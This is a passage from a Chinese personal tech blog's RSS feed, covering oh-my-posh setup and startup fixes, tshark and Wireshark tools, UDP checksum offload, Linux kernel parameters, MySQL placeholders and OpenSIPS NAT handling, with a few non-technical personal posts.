&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看到其中几行日志：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2022/07/09 12:20:23 error: HTTPRequest
Get &amp;#34;https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json&amp;#34;: context deadline exceeded
2022/07/09 12:20:23 HTTPRequest duration: 5.0072715s, args: https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json
2022/07/09 12:20:23 downloadConfig duration: 5.0072715s, args: https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json
2022/07/09 12:20:23 resolveConfigPath duration: 5.0072715s, args:
2022/07/09 12:20:23 Init duration: 5.0072715s, args:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;好家伙，原来每次启动，oh-my-posh还去github上下载了一个文件。&lt;/p&gt;
&lt;p&gt;因为下载文件而拖慢了整个启动过程。&lt;/p&gt;
&lt;p&gt;然后在github issue上倒找：&lt;a href=&#34;https://github.com/JanDeDobbeleer/oh-my-posh/issues/2251&#34;&gt;https://github.com/JanDeDobbeleer/oh-my-posh/issues/2251&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;oh-my-posh init pwsh &amp;ndash;config ~/default.omp.json&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;其中关键一点是启动oh-my-posh的时候，如果不用&amp;ndash;config配置默认的文件，oh-my-posh就回去下载默认的配置文件。&lt;/p&gt;
&lt;p&gt;所以问题就好解决了。&lt;/p&gt;
&lt;p&gt;首先下载&lt;a href=&#34;https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json&#34;&gt;https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/v8.15.0/themes/default.omp.json&lt;/a&gt; 这个文件，然后再保存到用户的家目录里面。&lt;/p&gt;
&lt;p&gt;然后打开terminal,  输入： code $profile&lt;/p&gt;
&lt;p&gt;前提是你的电脑上要装过vscode,  然后给默认的profile加上&amp;ndash;config参数，试了一下，问题解决。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;oh-my-posh init pwsh --config ~/default.omp.json | Invoke-Expression
Import-Module PSReadLine
New-Alias -Name ll -Value ls

if ($host.Name -eq &amp;#39;ConsoleHost&amp;#39;)
{
    Import-Module PSReadLine
    Set-PSReadLineOption -EditMode Emacs
}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>windows11 安装 oh my posh</title>
      <link>https://wdd.js.org/posts/2022/07/ssgb9f/</link>
      <pubDate>Fri, 08 Jul 2022 13:30:15 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/07/ssgb9f/</guid>
      <description>&lt;h1 id=&#34;0-前提条件&#34;&gt;0. 前提条件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;系统是windows11&lt;/li&gt;
&lt;li&gt;已经安装过powershell 7&lt;/li&gt;
&lt;li&gt;安装过vscode编辑器&lt;/li&gt;
&lt;li&gt;默认情况下，所有命令均在powershell下执行的&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;1-安装-oh-my-posh&#34;&gt;1. 安装 oh my posh&lt;/h1&gt;
&lt;h2 id=&#34;12-方式1-通过代理安装&#34;&gt;1.2 方式1： 通过代理安装&lt;/h2&gt;
&lt;p&gt;假如你有socks代理，那么可以用winget安装&lt;/p&gt;
&lt;p&gt;打开你的power shell 执行类似下面的命令，来配置代理&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$env:all_proxy=&amp;#34;socks5://127.0.0.1:1081&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果没有socks代理，最好不要用winget安装，因为速度太慢。&lt;!-- raw HTML omitted --&gt;然后执行：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;winget install JanDeDobbeleer.OhMyPosh -s winget
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;12-方式2-下载exe手工安装&#34;&gt;1.2 方式2： 下载exe，手工安装&lt;/h2&gt;
&lt;p&gt;再oh-my-posh的release界面 &lt;a href=&#34;https://github.com/JanDeDobbeleer/oh-my-posh/releases&#34;&gt;https://github.com/JanDeDobbeleer/oh-my-posh/releases&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可以看到很多版本的文件，windows选择install-amd64.exe,  下载完了之后手工点击执行来安装。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/JanDeDobbeleer/oh-my-posh/releases/download/v8.13.1/install-amd64.exe&#34;&gt;https://github.com/JanDeDobbeleer/oh-my-posh/releases/download/v8.13.1/install-amd64.exe&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-配置-oh-my-posh&#34;&gt;2. 配置 oh-my-posh&lt;/h1&gt;
&lt;p&gt;在powershell中执行下面的命令，vscode回打开对应的文件。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;code $PROFILE
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在文件中粘贴如下的内容：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;oh-my-posh init pwsh | Invoke-Expression
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;保存文件，然后再次打开windows termial, 输入下面的命令来reload profile&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;. $PROFILE
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后你可以看到终端出现了提示符，有可能有点卡，第一次是有点慢的。但是很多符号可能是乱码，因为是没有配置相关的字体。&lt;/p&gt;
&lt;h1 id=&#34;3-字体配置&#34;&gt;3. 字体配置&lt;/h1&gt;
&lt;h2 id=&#34;31-安装字体&#34;&gt;3.1 安装字体&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;下载文件 &lt;a href=&#34;https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/Meslo.zip&#34;&gt;https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/Meslo.zip&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;解压文件&lt;/li&gt;
&lt;li&gt;打开设置，在个性化》字体中，将之前下载好的所有字体，拖动到下面的红框中，字体就会自动安装&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/07/ssgb9f/2022-10-29-20-34-37.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;32-windows-termial字体配置&#34;&gt;3.2 windows termial字体配置&lt;/h2&gt;
&lt;p&gt;用vscode打开对windows termial的配置json文件，在profiles.default.font中配置如下字体&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;font&amp;#34;:
{
      &amp;#34;face&amp;#34;: &amp;#34;MesloLGM NF&amp;#34;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/07/ssgb9f/2022-10-29-20-34-45.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>关于我在闲鱼卖二手这件事</title>
      <link>https://wdd.js.org/posts/2022/07/guv65u/</link>
      <pubDate>Thu, 07 Jul 2022 21:34:28 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/07/guv65u/</guid>
      <description>&lt;p&gt;自从我换了新款的惠普战X之后，我的老搭档，2017款的macbook pro， 已经在沙发上躺了很久了。&lt;/p&gt;
&lt;p&gt;我拍了拍它的脑袋，对它语重心长的说：  人不能闲着，闲着容易生病，笔记本也是如此。虽然你已经是5年前的mbp了， 但是廉颇老矣，尚能饭否？&lt;/p&gt;
&lt;p&gt;mbp面无表情，胡子邋遢，朝我瞥了一眼，像是嘲讽，又像是不满，一口气吸掉还剩一点的香烟，有气无力的说：我已经工作五年了，按照国家的法律规定，已经到了退休的年龄，是该享受享受了。&lt;/p&gt;
&lt;p&gt;我&lt;/p&gt;</description>
    </item>
    <item>
      <title>最后一篇blog， 是时候说再见了</title>
      <link>https://wdd.js.org/posts/2022/06/fk9rgk/</link>
      <pubDate>Thu, 30 Jun 2022 22:40:56 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/06/fk9rgk/</guid>
      <description>&lt;p&gt;我最早用过有道，我觉得有道很烂。&lt;/p&gt;
&lt;p&gt;后来我开始用印象笔记，我发现印象笔记更烂。不仅界面做的让人觉得侮辱眼睛，即使你开了会员也要看广告。 印象笔记会员被割了韭菜，充到了2026年，但是我最近一两年我基本没有用过印象笔记。&lt;/p&gt;
&lt;p&gt;后来我遇到了文档blog界的new school,  notion、语雀、飞书， 就完全抛弃了有道和印象笔记的old school。&lt;/p&gt;
&lt;p&gt;做任何事情，都需要动机。&lt;/p&gt;
&lt;p&gt;写公开博客也是如此。可能有以下原因&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提升个人影响力&lt;/li&gt;
&lt;li&gt;提高自己的表达能力&lt;/li&gt;
&lt;li&gt;知识积累和分享&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;公开博客需要三方角力，平台方、内容生产者、内容消费者(读者)。&lt;/p&gt;
&lt;p&gt;作为内容生产者，我们从选择一个平台是需要很多理由的。可能是UI界面的颜值，可能是一见钟情界面交互。&lt;/p&gt;
&lt;p&gt;就像男女的相亲，首先要被外貌吸引，才能有下文。&lt;/p&gt;
&lt;p&gt;然而除了那一见钟情的必然是短暂的，除此之外，我发现了另一个重要原因：&lt;strong&gt;迁移成本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我以前决定不用印象的时候，印象笔记上还有我将近一千多篇的笔记。虽说印象笔记有导出工具，但是只有当你用的时候，你才能体会导出工具是多坑爹。&lt;/p&gt;
&lt;p&gt;假如你一天决定不用这个平台了，你想把所有你产出的内容都迁移出来，你要花费多少成本呢？ 很多人都没有考虑过这件事情。&lt;/p&gt;
&lt;p&gt;就像温水煮青蛙，只有感觉到烫的时候，青蛙才会准备跳走，但是青蛙还能跳出去吗？ 可能他的腿都已经煮熟了吧？&lt;/p&gt;
&lt;p&gt;从另外一个方面来说，作为内容生产者，我们要花时间，花精力来写文章，还要花金钱来买平台的会员，然而平台对内容生产者来说，有什么回报呢？&lt;/p&gt;
&lt;p&gt;我们只不过是为他人做嫁衣罢了。就像旧时代的长工，只不过在一个大一点的地主家干活了吧。&lt;/p&gt;
&lt;p&gt;再见了，语雀。&lt;/p&gt;
&lt;p&gt;新的bolg地址:  &lt;a href=&#34;https://wdd.js.org/&#34;&gt;wdd.js.org&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我以前没得选，我现在想选择做个自由人&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tshark入门到精通</title>
      <link>https://wdd.js.org/network/tshark/</link>
      <pubDate>Thu, 30 Jun 2022 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/network/tshark/</guid>
      <description>&lt;h1 id=&#34;1-使用摘要&#34;&gt;1. 使用摘要&lt;/h1&gt;
&lt;p&gt;一个命令的使用摘要非常重要，摘要里包含了这个工具最常用的用法。&lt;/p&gt;
&lt;p&gt;要注意的是，如果要用过滤器，一定要放到最后。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tshark [ -i &amp;lt;capture interface&amp;gt;|- ] [ -f &amp;lt;capture filter&amp;gt; ] [ -2 ] [ -r &amp;lt;infile&amp;gt; ] [ -w &amp;lt;outfile&amp;gt;|- ] [ options ] [ &amp;lt;filter&amp;gt; ]

tshark -G [ &amp;lt;report type&amp;gt; ] [ --elastic-mapping-filter &amp;lt;protocols&amp;gt; ]
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-为什么要学习tshark&#34;&gt;2. 为什么要学习tshark?&lt;/h1&gt;
&lt;p&gt;一般情况下，我们可能会在服务端用tcpdump抓包，然后把包拿下来，用wireshark分析。那么我们为什么要学习tshark呢？&lt;/p&gt;
&lt;p&gt;相比于wireshark， tshark有以下的优点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;速度飞快：wireshark在加载包的时候，tshark可能已经给出了结果。&lt;/li&gt;
&lt;li&gt;更稳定：wireshark在处理包的时候，常常容易崩溃&lt;/li&gt;
&lt;li&gt;更适合做文本处理：tshark的输出是文本，这个文本很容易被awk, sort, uniq等等命令处理&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是我不建议上来就学习，更建议在熟悉wireshark之后，再去进一步学习tshark&lt;/p&gt;
&lt;h1 id=&#34;3-使用场景&#34;&gt;3. 使用场景&lt;/h1&gt;
&lt;h2 id=&#34;31-基本场景&#34;&gt;3.1 基本场景&lt;/h2&gt;
&lt;p&gt;用wireshark最基本的场景的把pcap文件拖动到wireshark中，然后可能加入一些过滤条件。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tshark -r demo.pcap
tshark -r demo.pcap -c 1 # 只读一个包就停止
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出的列分别为：序号，相对时间，绝对时间，源ip, 源端口，目标ip, 目标端口&lt;/p&gt;
&lt;h2 id=&#34;32-按照表格输出&#34;&gt;3.2 按照表格输出&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tshark -r demo.pcap -T tabs
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;33-按照指定的列输出&#34;&gt;3.3 按照指定的列输出&lt;/h2&gt;
&lt;p&gt;例如，抓的的sip的包，我们只想输出sip的user-agent字段。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Udp Checksum Offload</title>
      <link>https://wdd.js.org/network/udp-checksum-offload/</link>
      <pubDate>Thu, 30 Jun 2022 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/network/udp-checksum-offload/</guid>
      <description>&lt;p&gt;在服务端抓包，然后在wireshark上分析，发现wireshark提示：udp checksum字段有问题&lt;/p&gt;
&lt;p&gt;checksum 0x&amp;hellip; incrorect should be 0x.. (maybe caused by udp checksum offload)&lt;/p&gt;
&lt;p&gt;以前我从未遇到过udp checksum的问题。所以这次是第一次遇到，所以需要学习一下。
首先udp checksum是什么？&lt;/p&gt;
&lt;p&gt;我们看下udp的协议组成的字段，其中就有16位的校验和&lt;/p&gt;
&lt;p&gt;校验和一般都是为了检验数据包在传输过程中是否出现变动的。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果接受端收到的udp消息校验和错误，将会被悄悄的丢弃&lt;/li&gt;
&lt;li&gt;udp校验和是一个端到端的校验和。端到端意味它不会在中间网络设备上校验。&lt;/li&gt;
&lt;li&gt;校验和由发送方负责计算，接收端负责验证。目的是为了发现udp首部和和数据在发送端和接受端之间是否发生了变动&lt;/li&gt;
&lt;li&gt;udp校验和是可选的功能，但是总是应该被默认启用。&lt;/li&gt;
&lt;li&gt;如果发送方设置了udp校验和，则接受方必须验证&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;发送方负责计算？具体是谁负责计算&lt;/p&gt;
&lt;p&gt;计算一般都是CPU的工作，但是有些网卡也是支持checksum offload的。&lt;/p&gt;
&lt;p&gt;所谓offload, 是指本来可以由cpu计算的，改变由网卡硬件负责计算。
这样做有很多好处，&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以降低cpu的负载，提高系统的性能&lt;/li&gt;
&lt;li&gt;网卡的硬件checksum, 效率更高&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;为什么只有发送方出现udp-checksum-错误&#34;&gt;为什么只有发送方出现udp checksum 错误？&lt;/h1&gt;
&lt;p&gt;我在接受方和放松方都进行了抓包，一个比较特殊的特征是，只有发送方发现了udp checksum的错误，在接受方，同样的包，udp checksum的值却是正确的。&lt;/p&gt;
&lt;p&gt;一句话的解释：tcpdump在接收方抓到的包，本身checksum字段还没有被计算，在后续的步骤，这个包才会被交给NIC, NIC来负责计算。&lt;/p&gt;
&lt;h1 id=&#34;结论&#34;&gt;结论&lt;/h1&gt;
&lt;p&gt;maybe caused by udp checksum offload 这个报错并没有什么问题。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;p&gt;● 《tcp/ip 详解》
● &lt;a href=&#34;https://www.kernel.org/doc/html/latest/networking/checksum-offloads.html&#34;&gt;https://www.kernel.org/doc/html/latest/networking/checksum-offloads.html&lt;/a&gt;
● &lt;a href=&#34;https://dominikrys.com/posts/disable-udp-checksum-validation/&#34;&gt;https://dominikrys.com/posts/disable-udp-checksum-validation/&lt;/a&gt;
● &lt;a href=&#34;https://sokratisg.net/2012/04/01/udp-tcp-checksum-errors-from-tcpdump-nic-hardware-offloading/&#34;&gt;https://sokratisg.net/2012/04/01/udp-tcp-checksum-errors-from-tcpdump-nic-hardware-offloading/&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Wireshark 附带的19命令行程序</title>
      <link>https://wdd.js.org/network/wireshark-extra-cli/</link>
      <pubDate>Thu, 30 Jun 2022 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/network/wireshark-extra-cli/</guid>
      <description>&lt;p&gt;大多数时候我们都是图形界面的方式使用wireshak, 其实一般只要你安装了wireshark，同时也附带安装了一些命令行工具。
这些工具也可以极大的提高生产效率。
本文只是对工具的功能简介，可以使用命令 -h, 查看命令的具体使用文档。&lt;/p&gt;
&lt;h1 id=&#34;1-editcap-编辑抓包文件&#34;&gt;1. editcap 编辑抓包文件&lt;/h1&gt;
&lt;p&gt;Editcap (Wireshark) 3.6.1 (v3.6.1-0-ga0a473c7c1ba)
Edit and/or translate the format of capture files.
举例: 按照时间范围从input.pcap文件中拿出指定时间范围的包&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;editcap -A &amp;#39;2014-12-10 10:11:01&amp;#39; -B &amp;#39;2014-12-10 10:21:01&amp;#39; input.pcap output.pcap
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-androiddump&#34;&gt;2. androiddump&lt;/h1&gt;
&lt;p&gt;这个命令似乎可以用来对安卓系统进行抓包，没玩过安卓，不再多说。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Wireshark - androiddump v1.1.0
Usage:
 androiddump --extcap-interfaces [--adb-server-ip=&amp;lt;arg&amp;gt;] [--adb-server-tcp-port=&amp;lt;arg&amp;gt;]
 androiddump --extcap-interface=INTERFACE --extcap-dlts
 androiddump --extcap-interface=INTERFACE --extcap-config
 androiddump --extcap-interface=INTERFACE --fifo=PATH_FILENAME --capture
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-ciscodump&#34;&gt;3. ciscodump&lt;/h1&gt;
&lt;p&gt;似乎是对思科的网络进行抓包的，没用过
Wireshark - ciscodump v1.0.0
Usage:
ciscodump &amp;ndash;extcap-interfaces
ciscodump &amp;ndash;extcap-interface=ciscodump &amp;ndash;extcap-dlts
ciscodump &amp;ndash;extcap-interface=ciscodump &amp;ndash;extcap-config
ciscodump &amp;ndash;extcap-interface=ciscodump &amp;ndash;remote-host myhost &amp;ndash;remote-port 22222 &amp;ndash;remote-username myuser &amp;ndash;remote-interface gigabit0/0 &amp;ndash;fifo=FILENAME &amp;ndash;capture&lt;/p&gt;</description>
    </item>
    <item>
      <title>vfs_cache_pressure和min_free_kbytes对cache的影响</title>
      <link>https://wdd.js.org/posts/2022/06/eafeid/</link>
      <pubDate>Wed, 29 Jun 2022 06:57:56 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/06/eafeid/</guid>
      <description>&lt;h1 id=&#34;环境&#34;&gt;环境&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;kernal Linux 5.15.48-1-MANJARO #1 SMP PREEMPT Thu Jun 16 12:33:56 UTC 2022 x86_64 GNU/Linux&lt;/li&gt;
&lt;li&gt;docker  20.10.16&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;初始内存&#34;&gt;初始内存&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;               total        used        free      shared  buff/cache   available
内存：       30Gi       1.9Gi        19Gi       2.0Mi       9.6Gi        28Gi
交换：         0B          0B          0B
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;初始配置&#34;&gt;初始配置&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sysctl -n vm.min_free_kbytes
67584
sysctl -n vm.vfs_cache_pressure
200
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;vfs_cache_pressure的对内存的影响&#34;&gt;vfs_cache_pressure的对内存的影响&lt;/h1&gt;
&lt;p&gt;vfs_cache_pressure设置为200， 理论系统倾向于回收内存&lt;/p&gt;</description>
    </item>
    <item>
      <title>manjaro 安装 packettracer</title>
      <link>https://wdd.js.org/posts/2022/06/manjaro-packettracer/</link>
      <pubDate>Wed, 15 Jun 2022 18:54:11 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/06/manjaro-packettracer/</guid>
      <description>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 将会下载packettracer到当前目录下
yay -G packettracer
cd packettracer

# Download PacketTracer_731_amd64.deb to this folder
makepkg

sudo pacman -U packettracer-7.3.1-2-x86_64.pkg.tar.xz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意，如果下载的packetraacer包不是PacketTracer_731_amd64.deb， 则需要修改PKGBUILD文件中的, souce对应的文件名。 例如我下载的packettracer是Cisco_Packet_Tracer_811_Ubuntu_64bit_cf200f5851.deb&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;source=(&amp;#39;local://Cisco_Packet_Tracer_811_Ubuntu_64bit_cf200f5851.deb&amp;#39;                                                                                                       
    &amp;#39;packettracer.sh&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意：最新版的packertracer打开后，必须登陆账号才能使用，有点坑。 花费点时间注册了账号后，才能用。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/06/manjaro-packettracer/2022-10-29-19-34-07.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://forum.manjaro.org/t/how-to-get-cisco-packet-tracer-on-manjaro/25506/5&#34;&gt;https://forum.manjaro.org/t/how-to-get-cisco-packet-tracer-on-manjaro/25506/5&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Linux内核参数rp_filter</title>
      <link>https://wdd.js.org/network/rp_filter/</link>
      <pubDate>Mon, 13 Jun 2022 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/network/rp_filter/</guid>
      <description>&lt;h1 id=&#34;问题现象&#34;&gt;问题现象&lt;/h1&gt;
&lt;p&gt;主机上有两个网卡ens192和ens224。ens129网卡是对内网络的网卡，ens224是对网网络的网卡。&lt;/p&gt;
&lt;p&gt;SIP信令阶段都是正常的，但是发现，对于来自node3的RTP流， 并没有从ens192网卡转发给node1上。&lt;/p&gt;
&lt;pre class=&#34;mermaid&#34;&gt;sequenceDiagram
    title network
    autonumber
    node1-&amp;gt;&amp;gt;ens192: INVITE
    ens224-&amp;gt;&amp;gt;node2: INVITE
    node2-&amp;gt;&amp;gt;ens224: 200 ok
    ens192-&amp;gt;&amp;gt;node1: 200 ok
    node1-&amp;gt;&amp;gt;ens192: ACK
    ens224-&amp;gt;&amp;gt;node2: ACK
    node1--&amp;gt;&amp;gt;ens192: RTP out
    ens224--&amp;gt;&amp;gt;node3: RTP out
    node3--&amp;gt;&amp;gt;ens224: RTP in
&lt;/pre&gt;
&lt;p&gt;抓包程序抓到了node3发送到ens224上的包，但是排查应用服务器的日志发现，似乎应用服务器根本没有收到node3上过来的包, 所以也就无法转发。&lt;/p&gt;
&lt;p&gt;因而怀疑是不是在内核上被拦截了。 后来通过将rp_filter设置为0, 然后语音流的转发就正常了。&lt;/p&gt;
&lt;h1 id=&#34;事后复盘&#34;&gt;事后复盘&lt;/h1&gt;
&lt;p&gt;node3的这个IP直接往应用服务器上发包，可能会被拦截。因为在信令建立的阶段，应用服务器并没有主动发&lt;/p&gt;
&lt;h1 id=&#34;在kernel文档上&#34;&gt;在kernel文档上&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rp_filter - INTEGER
	0 - No source validation.
	1 - Strict mode as defined in RFC3704 Strict Reverse Path
	    Each incoming packet is tested against the FIB and if the interface
	    is not the best reverse path the packet check will fail.
	    By default failed packets are discarded.
	2 - Loose mode as defined in RFC3704 Loose Reverse Path
	    Each incoming packet&amp;#39;s source address is also tested against the FIB
	    and if the source address is not reachable via any interface
	    the packet check will fail.

	Current recommended practice in RFC3704 is to enable strict mode
	to prevent IP spoofing from DDos attacks. If using asymmetric routing
	or other complicated routing, then loose mode is recommended.

	The max value from conf/{all,interface}/rp_filter is used
	when doing source validation on the {interface}.

	Default value is 0. Note that some distributions enable it
	in startup scripts.
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/717e6cd9d2bb&#34;&gt;https://www.jianshu.com/p/717e6cd9d2bb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/16d5c130670b&#34;&gt;https://www.jianshu.com/p/16d5c130670b&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt&#34;&gt;https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>mysql placeholder的错误使用方式</title>
      <link>https://wdd.js.org/posts/2022/06/vvdqw6/</link>
      <pubDate>Sat, 11 Jun 2022 23:51:34 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/06/vvdqw6/</guid>
      <description>&lt;div class=&#34;notice error&#34;&gt;
  &lt;div class=&#34;notice-title&#34;&gt;
    &lt;i class=&#34;fa fa-times-circle&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Error
  &lt;/div&gt;
  &lt;div class=&#34;notice-content&#34;&gt;EXTRA *mysql.MySQLError=Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;lsquo;? (&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;然而我仔细看了看sql语句，没有看出来究竟哪里有sql报错。&lt;/p&gt;
&lt;p&gt;然而当我把作为placeholder的问号去掉，直接用表的名字，sql是可以直接执行的。我意识到这个可能是和placeholder有关。&lt;/p&gt;
&lt;p&gt;搜索了一下，看到一个链接 &lt;a href=&#34;https://github.com/go-sql-driver/mysql/issues/848&#34;&gt;https://github.com/go-sql-driver/mysql/issues/848&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Placeholder can&amp;rsquo;t be used for table name or column name. It&amp;rsquo;s MySQL spec. Not bug of this project.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;大意是说，placeholder是不能作为表名或者列名的。&lt;/p&gt;
&lt;p&gt;在mysql关于prepared文档介绍中，在允许使用prepared的语句里，没有看到create table可以用placeholder&lt;!-- raw HTML omitted --&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html&#34;&gt;https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;prepared语句的优点有以下几个&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;优化查询速度&lt;/li&gt;
&lt;li&gt;防止sql注入&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但是也有一些限制&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不是所有语句都能用prepared语句。常见的用法应该是作为select where之后的条件，或者INSERT语句之后的值&lt;/li&gt;
&lt;li&gt;不支持一个sql中多条查询语句的形式&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>NAT场景下的信令处理 - 单网卡</title>
      <link>https://wdd.js.org/opensips/ch9/nat-single-interface/</link>
      <pubDate>Fri, 10 Jun 2022 20:27:09 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/nat-single-interface/</guid>
      <description>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;              OPS
&amp;lt;&amp;lt;&amp;lt;----------------------------- ingress
内网           | 公网
              ｜
              |
192.168.2.11  | 1.2.3.4
INNER_IP      | OUTER_IP
              |
              |
------------------------------&amp;gt;&amp;gt;&amp;gt; egress
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;常见共有云的提供的云服务器，一般都有一个内网地址如192.16.2.11和一个公网地址如1.2.3.4。 内网地址是配置在网卡上的；公网地址则只是一个映射，并未在网卡上配置。&lt;/p&gt;
&lt;p&gt;我们称从公网到内网的方向为ingress，从内网到公网的方向为egress。&lt;/p&gt;
&lt;p&gt;对于内网来说OpenSIPS的广播地址应该是INNER_IP,  所以对ingress方向的SIP请求，Via应该是INNER_IP。&lt;!-- raw HTML omitted --&gt;对于公网来说OpenSIPS的广播地址应该是OUT_IP,  随意对于egress方向的SIP请求，Via应该是OUTER_IP。&lt;/p&gt;
